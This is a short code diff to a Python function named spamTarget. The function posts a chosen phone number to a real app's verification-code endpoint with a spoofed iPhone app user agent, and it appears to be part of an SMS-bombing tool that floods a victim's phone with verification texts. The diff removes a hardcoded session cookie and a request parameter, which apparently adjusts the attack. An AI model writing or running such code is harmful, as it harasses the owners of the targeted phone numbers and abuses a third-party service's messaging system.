@@ -6,7 +6,6 @@ def spamTarget(target):
     urls = 'https://newapp.lgmi.com/login/getVerifyCode.asp'
     headers = {
         'Content-Type': 'application/x-www-form-urlencoded',
-        'Cookie': 'ASPSESSIONIDSCRDQCQQ=MKAAOIBBLNGDADMKONDNEFKE',
         'Connection': 'keep-alive',
         'Accept': '*/*',
         'User-Agent': 'ironLGMI/3.7.4 (iPhone; iOS 15.4.1; Scale/3.00)',
@@ -14,7 +13,7 @@ def spamTarget(target):
         'Content-Length': '24',
         'Accept-Encoding': 'gzip, deflate'
     }
-    payload = 'phone=' + target + '&type=3'
+    payload = 'phone=' + target 
     resp = requests.post(url=urls, headers=headers, data=payload).text
     print(resp)
 
